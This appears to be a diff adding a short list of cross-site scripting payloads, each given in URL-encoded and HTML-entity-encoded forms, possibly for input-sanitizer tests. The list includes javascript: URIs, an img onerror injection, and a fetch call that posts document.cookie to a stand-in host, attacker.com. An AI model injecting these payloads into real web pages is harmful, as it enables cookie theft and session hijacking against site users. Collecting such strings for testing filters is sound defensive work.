@@ -1,0 +1,8 @@
+javascript%3Aalert%28document.cookie%29
+javascript:alert(document.cookie)
+console.log%28document.cookie%29
+console.log(document.cookie)
+document.write%28%27%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%27%29
+document.write(&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;)
+fetch%28%27http%3A//attacker.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20body%3Adocument.cookie%7D%29
+fetch(&#x27;http://attacker.com&#x27;, {method: &#x27;POST&#x27;, body:document.cookie})
